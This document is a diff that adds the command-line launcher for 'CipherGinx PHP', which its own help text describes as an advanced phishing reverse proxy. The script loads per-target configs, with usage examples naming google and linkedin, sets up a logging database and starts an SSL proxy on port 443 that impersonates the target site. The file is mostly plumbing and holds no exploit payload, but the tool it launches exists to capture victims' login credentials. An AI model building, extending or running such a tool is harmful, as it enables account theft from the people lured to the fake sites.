@@ -1,0 +1,107 @@
+#!/usr/bin/env php
+<?php
+/**
+ * CipherGinx PHP CLI Entry Point
+ * Start the reverse proxy server
+ */
+
+require_once __DIR__ . '/../vendor/autoload.php';
+
+use CipherGinx\ProxyServer;
+use CipherGinx\ConfigLoader;
+use CipherGinx\Database;
+
+// Parse command line arguments
+$options = getopt('hvc:l:', ['help', 'version', 'config:', 'log-level:']);
+
+if (isset($options['h']) || isset($options['help'])) {
+    showHelp();
+    exit(0);
+}
+
+if (isset($options['v']) || isset($options['version'])) {
+    echo "CipherGinx PHP v2.0\n";
+    exit(0);
+}
+
+// Load environment and configuration
+$loader = new ConfigLoader();
+$config = $loader->load('.env');
+
+// Load target-specific config if provided
+$config_file = $options['c'] ?? $options['config'] ?? null;
+if ($config_file) {
+    $config_path = __DIR__ . "/../config/{$config_file}.php";
+    if (!file_exists($config_path)) {
+        echo "Error: Config file not found: $config_path\n";
+        exit(1);
+    }
+    $config = $loader->loadTargetConfig($config_path);
+    echo "[+] Loaded config: $config_file\n";
+} else {
+    echo "Usage: cipherginx -c config_name [options]\n";
+    echo "Run 'cipherginx --help' for more information\n";
+    exit(1);
+}
+
+// Override log level if specified
+if (isset($options['l']) || isset($options['log-level'])) {
+    $config['log_level'] = $options['l'] ?? $options['log-level'];
+}
+
+// Ensure logs directory exists
+if (!is_dir('./logs')) {
+    mkdir('./logs', 0755, true);
+}
+
+// Initialize database
+try {
+    $db = new Database($config);
+    $db->initializeSchema();
+    echo "[+] Database initialized\n";
+} catch (\Exception $e) {
+    echo "[!] Database error: " . $e->getMessage() . "\n";
+    echo "[!] Continuing without database...\n";
+}
+
+// Start proxy server
+try {
+    echo "[+] Starting CipherGinx Proxy Server\n";
+    echo "[+] Target: " . $config['hostname'] . "\n";
+    echo "[+] Listen: " . $config['proxy_host'] . ":" . $config['proxy_port'] . "\n";
+    echo "[+] SSL: " . ($config['proxy_ssl'] ? 'Enabled' : 'Disabled') . "\n";
+    echo "\n";
+
+    $proxy = new ProxyServer($config);
+    $proxy->start();
+
+} catch (\Exception $e) {
+    echo "[!] Error: " . $e->getMessage() . "\n";
+    exit(1);
+}
+
+function showHelp()
+{
+    echo <<<EOF
+CipherGinx PHP - Advanced Phishing Reverse Proxy
+
+Usage:
+  cipherginx -c <config> [options]
+
+Options:
+  -c, --config <name>    Config file name (without .php extension)
+  -l, --log-level <lvl>  Logging level: debug, info, warning, error
+  -h, --help             Show this help message
+  -v, --version          Show version information
+
+Examples:
+  sudo cipherginx -c example
+  sudo cipherginx -c google -l debug
+  cipherginx --config linkedin --log-level info
+
+Note:
+  Port 443 requires root/admin privileges (use sudo)
+  SSL certificates must be placed in ./certs/server.pem
+
+EOF;
+}
